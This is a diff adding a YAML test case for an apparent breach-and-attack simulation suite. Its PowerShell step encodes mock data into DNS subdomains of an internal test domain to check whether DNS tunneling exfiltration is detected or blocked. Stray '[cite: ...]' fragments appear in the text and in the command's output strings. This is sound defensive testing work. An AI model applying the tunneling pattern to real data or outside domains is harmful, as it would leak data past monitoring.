@@ -1,0 +1,51 @@
+id: em-10-endpoint-exfiltration
+name: "Endpoint Mastery 10 — Endpoint Data Exfiltration Channels"
+description: >
+  ENDPOINT MASTERY — Layer 10. Assesses out-of-band communication monitoring and protocol
+  anomaly visibility. Tests non-standard DNS query routing and alternative boundary transport options[cite: 4, 5].
+
+  VERDICTS: PASS = egress request blocked or filtered. FAIL = payload transport completed without intervention.
+author: Audspect Research
+executable: true
+supported_os: [windows]
+tags:
+  - endpoint-mastery
+  - em-layer-10
+  - exfiltration
+mitre_phases:
+  - exfiltration
+live_policy:
+  block_on_domain_controller: false
+  require_dc_reachable: false
+
+steps:
+  - name: "DNS Subdomain Tunneling simulation request (Data leak emulation)"
+    technique_id: T1071.004
+    framework: custom
+    executor: powershell
+    timeout_sec: 30
+    fidelity: telemetry-safe
+    production_safe: true
+    risk: low
+    reversible: true
+    blast_radius: "Resolves a unique mock data payload encoded inside subdomains toward an internal monitoring target[cite: 5]."
+    telemetry:
+      - "Sysmon EID 22: DNS query generated for long string subdomains"
+    detection:
+      - "EDR/DLP: Tunneling indicators inside custom sub-queries"
+    command: |
+      $ErrorActionPreference = 'SilentlyContinue'
+      # Encode a mock data string into standard hex/base64 lookalike parameter strings
+      $mockData = "7465737464617461657866696c626173" # "testdataexfilbas" hex
+      $targetQuery = "$mockData.leak-validation.audspect.internal"
+      $blocked = $false
+      try {
+        [System.Net.Dns]::GetHostAddresses($targetQuery) | Out-Null
+      } catch { $blocked = $true }
+      # Since it's a non-existent internal address, check if the error is due to resolution failure or an operational block
+      if ($blocked) {
+        Write-Output "PASS: DNS egress query was filtered, intercepted, or dropped before processing. [BAS-SIM][cite: 5]"
+      } else {
+        Write-Output "FAIL: Outbound non-standard DNS sub-resolution string dispatched without inspection constraints[cite: 5]."
+      }
+    cleanup: ""
